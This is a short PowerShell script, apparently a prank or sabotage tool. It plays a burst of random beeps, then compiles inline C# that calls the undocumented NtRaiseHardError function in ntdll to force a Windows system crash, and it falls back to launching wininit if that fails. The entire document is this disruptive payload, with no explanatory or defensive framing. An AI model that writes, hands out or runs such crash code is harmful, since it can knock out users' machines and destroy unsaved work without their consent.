Start-Sleep -Seconds 3

for ($i=0; $i -lt 10; $i++) {
    $freq = Get-Random -Min 50 -Max 2000
    $dur = Get-Random -Min 50 -Max 300
    [System.Console]::Beep($freq, $dur)
    Start-Sleep -Milliseconds (Get-Random -Min 10 -Max 100)
}

$code = @'
using System;
using System.Runtime.InteropServices;
public class BSOD {
    [DllImport("ntdll.dll")]
    public static extern int NtRaiseHardError(int ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ResponseOption, ref int Response);
    public static void Crash() {
        int resp = 0;
        NtRaiseHardError(0xC0000001, 0, 0, IntPtr.Zero, 0x20, ref resp);
    }
}
'@
try {
    Add-Type -TypeDefinition $code
    [BSOD]::Crash()
} catch {
    try { Start-Process wininit } catch {}
}